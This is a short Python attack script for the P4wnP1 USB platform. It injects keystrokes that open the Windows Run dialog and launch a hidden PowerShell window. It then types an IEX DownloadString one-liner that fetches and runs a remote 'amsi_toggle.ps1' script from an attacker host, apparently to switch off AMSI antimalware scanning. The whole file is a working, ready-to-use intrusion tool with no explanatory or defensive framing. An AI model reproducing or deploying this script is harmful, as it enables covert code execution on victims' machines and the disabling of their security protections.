#!/usr/bin/env python3
import os, sys, time, pathlib
P4WN_HOME=os.environ.get("P4WN_HOME","/opt/p4wnp1")
sys.path.insert(0,str(pathlib.Path(P4WN_HOME)/"tools"))
from hid_type import win_r, type_string

SCRIPT = os.getenv("AMSI_SCRIPT", "/payloads/amsi_toggle.ps1") # served from payloads/www

def main():
    lhost = os.getenv("P4WN_LHOST","10.0.0.1")
    print("[*] AMSI wrapper via external script", SCRIPT)
    win_r(); time.sleep(0.4)
    type_string("powershell -nop -w hidden\n"); time.sleep(0.3)
    type_string(f"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}{SCRIPT}')\n")
if __name__ == "__main__": main()
